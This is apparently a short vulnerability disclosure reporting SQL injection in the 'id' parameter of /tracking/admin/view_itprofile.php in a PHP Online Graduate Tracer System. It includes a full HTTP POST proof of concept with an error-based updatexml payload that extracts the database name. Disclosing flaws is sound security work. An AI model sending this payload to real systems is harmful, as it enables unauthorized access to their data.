## Online Graduate Tracer System has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/15904/online-graduate-tracer-system-college-ict-alumni.html

## Vulnerability file
/tracking/admin/view_itprofile.php

## Vulnerability analysis
<img width="1152" alt="image" src="https://github.com/user-attachments/assets/37488056-30bd-4343-b591-7e30a137c145">


## describe
There is an unrestricted SQL injection attack in the Online Graduate Tracer System, and the controllable parameter is id. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /tracking/admin/view_itprofile.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

id=1'%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q&checking_viewbtn=1
```
<img width="1242" alt="image" src="https://github.com/user-attachments/assets/58e78ce2-eb54-4120-aaac-fba66046c03c">







